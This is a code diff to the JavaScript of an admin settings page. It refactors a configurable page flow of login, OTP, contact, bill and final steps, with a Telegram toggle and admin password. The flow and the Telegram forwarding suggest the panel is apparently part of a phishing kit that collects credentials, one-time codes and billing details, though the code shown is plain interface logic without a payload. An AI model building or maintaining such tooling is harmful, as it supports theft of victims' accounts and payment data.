@@ -84,8 +84,10 @@
 <script>
 const REQUIRED_PAGES = ["login", "final"];
 
-let pageFlowConfig = {}; // step => { page, enabled }
-let pageOrder = [];
+let pageFlowConfig = {}; // step -> { page, enabled }
+let pageOrder = [];     // ordered array of page names
+let pageStepMap = {};   // page -> step
+
 let confirmedAdminPassword = null;
 
 /* ===============================
@@ -97,6 +99,9 @@ async function getSettings() {
   return res.json();
 }
 
+/* ===============================
+   LOAD SETTINGS
+================================ */
 async function loadSettings() {
   try {
     const data = await getSettings();
@@ -108,47 +113,38 @@ async function loadSettings() {
 
     document.getElementById("telegramToggle").checked = !!data.TelegramEnabled;
     document.getElementById("baSubToggle").checked = !!data.baSub;
-    
-    console.log(data.pageFlow); 
 
     const rawFlow = data.pageFlow || {
-	  "1": { page: "login",   enabled: true },
-	  "2": { page: "otp",     enabled: true },
-	  "3": { page: "contact", enabled: true },
-	  "4": { page: "bill",    enabled: true },
-	  "5": { page: "final",   enabled: true }
-	};
+      "1": { page: "login",   enabled: true },
+      "2": { page: "otp",     enabled: true },
+      "3": { page: "contact", enabled: true },
+      "4": { page: "bill",    enabled: true },
+      "5": { page: "final",   enabled: true }
+    };
 
-	pageFlowConfig = {};
-	pageOrder = [];
-	
-	Object.keys(rawFlow)
-	  .sort((a, b) => Number(a) - Number(b))
-	  .forEach(step => {
-	    const val = rawFlow[step];
-	
-	    // New format
-	    if (val && typeof val === "object" && "page" in val) {
-	      pageFlowConfig[step] = {
-	        page: val.page,
-	        enabled: !!val.enabled
-	      };
-	      pageOrder.push(val.page);
-	    }
-	
-	    // Old format
-	    else if (typeof val === "string") {
-	      pageFlowConfig[step] = {
-	        page: val,
-	        enabled: val !== "0"
-	      };
-	      pageOrder.push(val);
-	    }
-	  });
+    pageFlowConfig = {};
+    pageOrder = [];
+    pageStepMap = {};
+
+    Object.keys(rawFlow)
+      .sort((a, b) => Number(a) - Number(b))
+      .forEach(step => {
+        const val = rawFlow[step];
+
+        if (!val || typeof val !== "object" || !val.page) return;
+
+        pageFlowConfig[step] = {
+          page: val.page,
+          enabled: REQUIRED_PAGES.includes(val.page) ? true : !!val.enabled
+        };
+
+        pageOrder.push(val.page);
+        pageStepMap[val.page] = step;
+      });
 
     renderPageList();
-  } catch (e) {
-    console.error("Failed to load settings", e);
+  } catch (err) {
+    console.error("Failed to load settings", err);
   }
 }
 
@@ -160,17 +156,16 @@ function renderPageList() {
   list.innerHTML = "";
 
   pageOrder.forEach(page => {
-  console.log(pageOrder);
-  console.log("page:", page);
-    const stepKey = Object.keys(pageFlowConfig)
-      .find(k => pageFlowConfig[k].page === page);
+    const stepKey = pageStepMap[page];
+    if (!stepKey) return;
 
-    const step = pageFlowConfig[stepKey];
+    const { enabled } = pageFlowConfig[stepKey];
     const isRequired = REQUIRED_PAGES.includes(page);
 
     const li = document.createElement("li");
     li.dataset.page = page;
     li.draggable = !isRequired;
+
     if (isRequired) li.classList.add("disabled");
 
     li.innerHTML = `
@@ -178,7 +173,7 @@ function renderPageList() {
       <label class="switch">
         <input type="checkbox"
                data-page="${page}"
-               ${step.enabled ? "checked" : ""}
+               ${enabled ? "checked" : ""}
                ${isRequired ? "disabled" : ""}>
         <span class="slider"></span>
       </label>
@@ -200,9 +195,8 @@ function bindEvents() {
   list.querySelectorAll("input[type=checkbox]").forEach(cb => {
     cb.onchange = e => {
       const page = e.target.dataset.page;
-
-      const stepKey = Object.keys(pageFlowConfig)
-        .find(k => pageFlowConfig[k].page === page);
+      const stepKey = pageStepMap[page];
+      if (!stepKey) return;
 
       if (REQUIRED_PAGES.includes(page)) {
         e.target.checked = true;
@@ -249,15 +243,16 @@ function buildPageFlow() {
   const flow = {};
   let step = 1;
 
-  for (const page of pageOrder) {
-    const key = Object.keys(pageFlowConfig)
-      .find(k => pageFlowConfig[k].page === page);
+  pageOrder.forEach(page => {
+    const stepKey = pageStepMap[page];
+    if (!stepKey) return;
 
     flow[step++] = {
       page,
-      enabled: pageFlowConfig[key].enabled
+      enabled: pageFlowConfig[stepKey].enabled
     };
-  }
+  });
+
   return flow;
 }
 
